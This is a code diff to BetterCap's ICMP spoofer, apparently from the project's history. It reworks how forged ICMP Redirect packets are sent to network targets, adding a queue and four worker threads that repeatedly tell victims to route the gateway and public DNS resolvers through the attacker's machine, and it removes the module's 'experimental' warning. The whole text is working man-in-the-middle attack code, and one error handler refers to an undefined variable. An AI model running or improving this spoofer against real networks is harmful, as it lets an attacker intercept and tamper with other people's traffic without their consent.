@@ -80,8 +80,6 @@ end
 class Icmp < Base
   # Initialize the BetterCap::Spoofers::Icmp object.
   def initialize
-    Logger.warn "!!! 'BetterCap::Spoofers::Icmp' IS AN EXPERIMENTAL MODULE, IT'S NOT GUARANTEED TO WORK !!!\n"
-
     @ctx          = Context.get
     @forwarding   = @ctx.firewall.forwarding_enabled?
     @gateway      = nil
@@ -89,6 +87,8 @@ class Icmp < Base
     @spoof_thread = nil
     @watch_thread = nil
     @running      = false
+    @queue        = Queue.new
+    @workers      = nil
     @entries      = [ '8.8.8.8', '8.8.4.4',                # Google DNS
                       '208.67.222.222', '208.67.220.220' ] # OpenDNS
 
@@ -106,11 +106,7 @@ class Icmp < Base
   # everything in the @entries list of addresses to us.
   def send_spoofed_packet( target )
     ( [@gateway.ip] + @entries ).each do |address|
-      Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} redirecting #{address} to us ..."
-
-      pkt = ICMPRedirectPacket.new
-      pkt.update!( @gateway, target, @local, address )
-      pkt.to_w(@ctx.ifconfig[:iface])
+      @queue.push([target, address])
     end
   end
 
@@ -120,6 +116,27 @@ class Icmp < Base
 
     stop() if @running
     @running = true
+
+    @workers = (0...4).map {
+      ::Thread.new {
+        begin
+          while @running do
+            target, address = @queue.pop
+
+            Logger.debug "Sending ICMP Redirect to #{target.to_s_compact} redirecting #{address} to us ..."
+
+            3.times do
+              pkt = ICMPRedirectPacket.new
+              pkt.update!( @gateway, target, @local, address )
+              pkt.to_w(@ctx.ifconfig[:iface])
+              sleep(0.3)
+            end
+          end
+        rescue Exception => e
+          Logger.debug "#{self.class.name} : #{ip} -> #{e.message}"
+        end
+      }
+    }
 
     @ctx.firewall.enable_forwarding(true) unless @forwarding
     @ctx.firewall.disable_send_redirects
@@ -140,8 +157,11 @@ class Icmp < Base
     @running = false
     begin
       @spoof_thread.exit
-    rescue
-    end
+    rescue; end
+
+    begin
+      @workers.map(&:exit)
+    rescue; end
   end
 
   private
@@ -179,8 +199,6 @@ class Icmp < Base
             if a.respond_to?(:address)
               Logger.debug "[DNS] Redirecting #{a.address.to_s} ..."
               @entries << a.address.to_s unless @entries.include?(a.address.to_s)
-            else
-              puts a.inspect
             end
           end
         end
@@ -226,7 +244,7 @@ class Icmp < Base
 
       prev_size = @ctx.targets.size
 
-      sleep(1)
+      sleep(10)
     end
   end
 end
